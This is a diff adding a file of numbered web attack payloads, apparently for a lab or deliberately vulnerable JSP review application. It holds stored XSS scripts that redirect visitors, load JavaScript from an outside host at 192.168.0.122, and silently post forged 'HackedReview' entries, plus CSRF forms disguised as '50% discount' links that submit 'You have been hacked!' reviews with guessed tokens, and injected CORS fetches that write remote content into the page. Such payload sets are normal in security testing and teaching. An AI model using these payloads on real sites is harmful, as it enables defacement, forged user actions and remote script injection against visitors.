@@ -1,0 +1,109 @@
+1.
+<script>window.location.href="http://www.google.com";</script>
+
+2.
+<script src="http://192.168.0.122:8080/app/script.js"></script>
+
+3.
+Get 50% discount For details click <a href="reviews_post_redirect_get.jsp">here</a> or
+<form name="exploit" action="reviews_post_redirect_get.jsp" method="post" style="display: inline;">
+    <input type="hidden" name="review" value="You have been hacked!"/>
+    <input type="hidden" name="csrfToken" value="abc"/>
+    <input type="submit"  style="background: none !important; border: none !important; padding: 0 !important; font-family: serif; font-size: 1em; color: blue; text-decoration: underline; cursor: pointer;" value="here"/>
+    <button type="submit" style="background: none !important; border: none !important; padding: 0 !important; font-family: serif; font-size: 1em; color: blue; text-decoration: underline; cursor: pointer;">here</button>
+</form>.
+
+
+3.a
+Get great discount. For details click
+<form name="exploit" action="reviews_post_redirect_get.jsp" method="post" style="display: inline;">
+    <input type="hidden" name="csrfToken" value="trying some nonempty token..."/>
+    <input type="hidden" name="review" value="You have been hacked!"/>
+    <button type="submit" style="background: none; border: none; padding: 0; font-family: serif; font-size: 1em; color: blue; text-decoration: underline; cursor: pointer;">here</button>
+</form>
+
+
+4.
+could not load data (java script not enabled)
+<script>
+function sleep (time) {
+    return new Promise((resolve) => setTimeout(resolve, time));
+}
+async function sleepAndGet(value) {
+    await sleep(1000);
+    document.getElementById("mytable").rows[2].cells[2].innerHTML = value
+}
+
+const xhr = new XMLHttpRequest();
+// by default request only to localhost are allowed, if used other address, like ip, update target to return headers Access-Control-Allow-*
+xhr.open("GET", 'http://192.168.0.122:8080/app/cors.jsp', true);
+xhr.onreadystatechange = function() { // Call a function when the state changes.
+    if (this.readyState === XMLHttpRequest.LOADING) {
+        sleepAndGet("<img src=\"http://localhost:8080/app/icons/http-loading.gif\" width=\"20\" height=\"20\"  alt=\"loading\"/>");
+    }
+    if (this.readyState === XMLHttpRequest.DONE && this.status === 200) {
+        sleepAndGet(xhr.responseText);
+    }
+    if (this.readyState === XMLHttpRequest.DONE && this.status === 404) {
+        sleepAndGet("<img src=\"http://localhost:8080/app/icons/http-404.png\" width=\"20\" height=\"20\"  alt=\"not found (404)\"/>");
+    }
+}
+xhr.onerror = function() {
+    sleepAndGet("<img src=\"http://localhost:8080/app/icons/http-error.png\" width=\"20\" height=\"20\"  alt=\"http error\"/>");
+}
+xhr.send();
+</script>
+
+
+
+5.
+could not load data (java script not enabled)
+<script>
+function sleep (time) {
+    return new Promise((resolve) => setTimeout(resolve, time));
+}
+async function sleepAndGet(value) {
+    await sleep(1000);
+    document.getElementById("mytable").rows[2].cells[2].innerHTML = value
+}
+
+const xhr = new XMLHttpRequest();
+xhr.open("GET", 'http://localhost:8080/app/slow.jsp', true);
+xhr.onreadystatechange = function() { // Call a function when the state changes.
+    if (this.readyState === XMLHttpRequest.LOADING) {
+        sleepAndGet("<img src=\"http://localhost:8080/app/icons/http-loading.gif\" width=\"20\" height=\"20\"  alt=\"loading\"/>");
+    }
+    if (this.readyState === XMLHttpRequest.DONE && this.status === 200) {
+        sleepAndGet(xhr.responseText);
+    }
+    if (this.readyState === XMLHttpRequest.DONE && this.status === 404) {
+        sleepAndGet("<img src=\"http://localhost:8080/app/icons/http-404.png\" width=\"20\" height=\"20\"  alt=\"not found (404)\"/>");
+    }
+}
+xhr.onerror = function() {
+    sleepAndGet("<img src=\"http://localhost:8080/app/icons/http-error.png\" width=\"20\" height=\"20\"  alt=\"http error\"/>");
+}
+xhr.send();
+</script>
+
+
+6.
+That is hacked review<script>
+var xhr = new XMLHttpRequest();
+xhr.open("POST", 'reviews2.jsp', true);
+xhr.setRequestHeader('Content-type', 'application/x-www-form-urlencoded');
+xhr.send("review=HackedReview6");
+</script>
+
+
+7.
+<script>
+const xhr = new XMLHttpRequest();
+xhr.open("GET", 'http://localhost:8080/app/a.txt', true);
+xhr.onreadystatechange = function() { // Call a function when the state changes.
+    if (this.readyState === XMLHttpRequest.DONE && this.status === 200) {
+        document.getElementById("mytable").rows[2].cells[2].innerHTML = xhr.responseText;
+    }
+}
+xhr.send();
+</script>
